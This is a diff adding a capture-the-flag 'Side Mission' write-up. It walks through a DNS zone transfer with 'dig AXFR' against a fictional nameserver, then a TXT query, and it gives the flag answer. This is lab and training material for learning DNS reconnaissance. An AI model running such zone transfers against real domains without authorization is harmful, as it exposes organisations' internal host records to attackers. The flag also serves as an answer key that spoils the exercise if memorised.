@@ -1,0 +1,21 @@
+Side Mission: Ghost Zone
+
+Target: internal.attacker.zone
+Leaked NS Record: ghost.ns.attacker.zone
+
+Objective:
+Perform a DNS zone transfer to retrieve internal host records and extract the flag.
+
+Steps:
+1. Zone Transfer:
+   dig @ghost.ns.attacker.zone internal.attacker.zone AXFR
+
+2. Find Flag Record:
+   Look for TXT records or unusual entries:
+   flag.internal.attacker.zone. 60 IN TXT "CTF{dn5_r3b1nd_br34k}"
+
+3. Verify via Direct TXT Query:
+   dig @ghost.ns.attacker.zone TXT flag.internal.attacker.zone
+
+Flag:
+CTF{dn5_r3b1nd_br34k}
